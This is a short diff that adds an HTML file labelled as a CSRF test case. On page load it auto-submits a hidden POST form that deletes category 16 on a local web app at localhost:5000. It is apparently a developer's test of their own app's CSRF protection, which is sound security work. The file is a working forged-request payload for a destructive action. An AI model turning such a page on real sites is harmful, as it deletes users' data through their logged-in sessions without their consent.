@@ -1,0 +1,9 @@
+<!-- A test case for csrf attack -->
+<html>
+<body onload='document.CSRF.submit()'>
+
+<form action='http://localhost:5000/categories/16/delete/' method='POST' name='CSRF'>
+</form>
+
+</body>
+</html>
